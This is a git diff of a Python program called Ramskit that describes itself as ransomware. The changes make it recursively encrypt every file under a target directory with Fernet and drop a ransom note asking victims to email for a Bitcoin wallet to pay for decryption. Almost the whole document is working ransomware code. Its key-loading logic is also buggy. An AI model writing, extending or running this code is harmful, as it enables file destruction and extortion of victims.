@@ -24,6 +24,15 @@ from cryptography.fernet import Fernet
 class Ramskit:
     def __init__(self):
         print("[x] Starting Ramskit")
+        print("[x] Reading key...")
+        self.key = Ramskit.load_key()
+
+        if (key := Ramskit.load_key()) is None:
+            print("[x] Key does not exist.\n[x]Creating key...")
+            self.key = Ramskit.generate_key()
+        else:
+            self.key = key
+        print(f"[x] Key is {self.key}")
 
     def encrypt_file(self, items):
         f = Fernet(self.key)
@@ -49,14 +58,34 @@ class Ramskit:
             with open(item, 'wb') as file:
                 file.write(decrypted)
 
-def generate_key():
-    key = Fernet.generate_key()
-    with open('key.txt', 'wb') as file:
-        file.write(key)
-    return key
+    @staticmethod
+    def generate_key():
+        key = Fernet.generate_key()
+        with open('key.txt', 'wb') as file:
+            file.write(key)
+        return key
 
-def load_key():
-    return open('key.txt', 'rb').read()
+    @staticmethod
+    def load_key():
+        with open('key.txt', 'rb') as file:
+            return file.read()
+        return None
+
+    @staticmethod
+    def expand_dir(path: str) -> [str]:
+        try:
+            return [Ramskit.expand_dir(os.path.join(path, file)) for file in os.listdir(path)]
+        except NotADirectoryError:
+            return [path]
+
+    @staticmethod
+    def flatten(something):
+        if isinstance(something, (list, tuple, set, range)):
+            for sub in something:
+                yield from Ramskit.flatten(sub)
+        else:
+            yield something
+
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description="Ramskit - CLI Tool for Ramskit Ransomware")
@@ -69,34 +98,27 @@ if __name__ == '__main__':
     path = args.path
 
     ramskit = Ramskit()
+    items: [str] = list(Ramskit.flatten(Ramskit.expand_dir(path)))
+    lam = os.path.join(path, 'look_at_me.txt')
 
     match action:
         case 'encrypt':
-
-            items = os.listdir(path)
-            ramskit.encrypt_file(items)
-
-            with open(path + '/look_at_me.txt', 'w') as f:
+            with open(lam, 'w') as f:
                 f.write('''
-                    Heyo, this file has been encrypted!. 
-                    You need to email me so I can give u my BTC wallet for the 
+                    Heyo, this file has been encrypted!.
+                    You need to email me so I can give u my BTC wallet for the
                     decrypt's purchase lololololol \n\n
                 ''')
+            ramskit.encrypt_file(items)
         case 'decrypt':
-            
-            if not os.path.exists(path + '/look_at_me.txt'):
+            if not os.path.exists(lam):
                 print('No look_at_me.txt file found. Exiting...')
                 sys.exit(1)
-            
-            os.remove(path + '/look_at_me.txt')
-            items = os.listdir(path)
-
-            hole_path = [path + '/' + item for item in items]
-            ramskit.decrypt_file(hole_path)
-
+            os.remove(lam)
+            items.remove(lam)
+            ramskit.decrypt_file(items)
         case 'generate_key':
-            print(ramskit.generate_key())
+            print(Ramskit.generate_key())
         case _:
             raise Exception('Invalid action: ', action)
             sys.exit(1)
-
